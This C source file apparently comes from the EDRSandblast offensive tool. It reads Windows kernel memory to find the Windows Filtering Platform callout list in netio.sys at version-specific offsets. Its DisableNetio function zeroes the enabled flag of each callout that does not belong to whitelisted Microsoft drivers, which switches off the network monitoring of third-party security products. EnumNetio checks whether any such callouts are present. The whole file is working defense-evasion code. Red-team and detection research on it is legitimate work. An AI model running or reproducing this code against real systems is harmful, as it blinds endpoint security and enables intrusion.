#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "FltmgrOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "MinifilterCallbacks.h"

#include "./memory.h"
#include "./symbol.h"
#include "./netio.h"

MODULE_ID whitedModulesNetio[] = {
  MOD_ndu,
  MOD_tcpip,
  MOD_mpsdrv
};

PCHAR exportNamesNetio[] = {
   FOREACH_EXPORT_NETIO(STR)
};

// Subsets of id
UINT8 netioExports[] = { EXP_NETIO_FeGetWfpGlobalPtr };
// The same size of id
DWORD64 netioExportAddresses[EXPORT_NETIO_COUNT] = { 0 };

SYMBOL_META OS_10_gWfpGlobal = { EXP_NETIO_FeGetWfpGlobalPtr, 0, 0, 3 };
PSYMBOL_META getter_gWfpGlobal() {
  if (BuildIDKey >= OS_10_10240) {
    return &OS_10_gWfpGlobal;
  }

  return NULL;
}

// full of id
SYMBOL_META_POOL_ITEM symbolMetaPoolNetio[] = {
  {
    SYMBOL_NETIO_gWfpGlobal, getter_gWfpGlobal
  }
};
// full of id
DWORD64 netioSymbolAddresses[SYMBOL_NETIO_COUNT] = { 0 };

NETIO_SETTING settingsPool[] = {
  {OS_10_10240, 0x190, 0x50},
  {OS_10_10586, 0x148, 0x50},
  {OS_10_15063, 0x190, 0x50},
  {OS_10_22000, 0x198, 0x50}
};

MODULE_PATCHED ModuleNetio = 
{ "netio.sys", 0, 0, NULL, EXPORT_NETIO_COUNT, netioExports, exportNamesNetio, netioExportAddresses, SYMBOL_NETIO_COUNT, symbolMetaPoolNetio, netioSymbolAddresses };

#define OFFSET_ENABLED_FLAG 4
#define OFFSET_classifyFn 0x10
#define OFFSET_notifyFn 0x18
#define OFFSET_classifyFnFast 0x28
UINT8 offsetsFN[] = { OFFSET_classifyFn, OFFSET_notifyFn, OFFSET_classifyFnFast };
void DisableNetio() {
  PNETIO_SETTING pSettings = (PNETIO_SETTING)FindVersionedStruct((PBYTE)settingsPool, _countof(settingsPool), sizeof(NETIO_SETTING));
  DWORD64 gWfpGlobal = ReadMemoryDWORD64(netioSymbolAddresses[SYMBOL_NETIO_gWfpGlobal]);
  UINT32 listCount = ReadMemoryDWORD(gWfpGlobal + pSettings->sizeOffset);
  DWORD64 item = ReadMemoryDWORD64(gWfpGlobal + pSettings->sizeOffset + sizeof(PVOID));

  for (UINT32 i = 0; i < listCount; i++, item += pSettings->itemSize) {
    DWORD64 enabledAddr = item + OFFSET_ENABLED_FLAG;
    UINT32 enabled = ReadMemoryDWORD(enabledAddr);
    printf("Callout No.%x enabled [%u]\n", i, enabled);
    if (enabled) {
      DWORD64 fn = 0;
      for (UINT8 j = 0; j < _countof(offsetsFN); j++) {
        fn = ReadMemoryDWORD64(item + offsetsFN[j]);
        if (fn > 0) {
          break;
        }
      }
#ifdef _DEBUG
      BelongToDriver(fn);
#endif
      if (!IsAddressWhitelisted(whitedModulesNetio, _countof(whitedModulesNetio), fn)) {
        PatchSize(enabledAddr, (Value){ .dword = 0 }, S4);
        printf("  >>> Disabled\n");
      }
    }
  }
}

BOOL EnumNetio() {
  PNETIO_SETTING pSettings = (PNETIO_SETTING)FindVersionedStruct((PBYTE)settingsPool, _countof(settingsPool), sizeof(NETIO_SETTING));
  DWORD64 gWfpGlobal = ReadMemoryDWORD64(netioSymbolAddresses[SYMBOL_NETIO_gWfpGlobal]);
  UINT32 listCount = ReadMemoryDWORD(gWfpGlobal + pSettings->sizeOffset);
  DWORD64 item = ReadMemoryDWORD64(gWfpGlobal + pSettings->sizeOffset + sizeof(PVOID));

  for (UINT32 i = 0; i < listCount; i++, item += pSettings->itemSize) {
    DWORD64 enabledAddr = item + OFFSET_ENABLED_FLAG;
    UINT32 enabled = ReadMemoryDWORD(enabledAddr);
    printf("Callout No.%x enabled [%u]\n", i, enabled);
    if (enabled) {
      DWORD64 fn = 0;
      for (UINT8 j = 0; j < _countof(offsetsFN); j++) {
        fn = ReadMemoryDWORD64(item + offsetsFN[j]);
        if (fn > 0) {
          break;
        }
      }
      if (!IsAddressWhitelisted(whitedModulesNetio, _countof(whitedModulesNetio), fn)) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

